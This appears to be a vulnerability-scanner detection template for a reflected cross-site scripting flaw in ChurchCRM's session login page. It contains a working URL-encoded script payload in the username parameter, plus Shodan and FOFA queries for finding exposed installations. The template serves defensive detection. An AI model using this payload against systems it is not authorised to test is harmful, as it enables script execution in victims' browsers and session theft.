id: churchcrm-xss

info:
  name: ChurchCRM - 跨站脚本漏洞
  author: pikpikcu
  severity: medium
  description: |
    该模板用于检测 ChurchCRM - 跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://github.com/ChurchCRM/CRM/blob/91cfa8eb00aef724705f5e038c236c146c6cf3a6/src/session/templates/begin-session.php#L39
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cwe-id: CWE-80
    epss-score: 0.07062
    epss-percentile: 0.94141
    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"ChurchCRM"
    fofa-query: app="ChurchCRM"
    product: churchcrm
    vendor: churchcrm
  tags: churchcrm,xss,crm,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(to_lower(content_type), "text/html")'
          - 'contains_all(tolower(body), "<script>alert(document.domain)</script>", "churchcrm")'
        condition: and
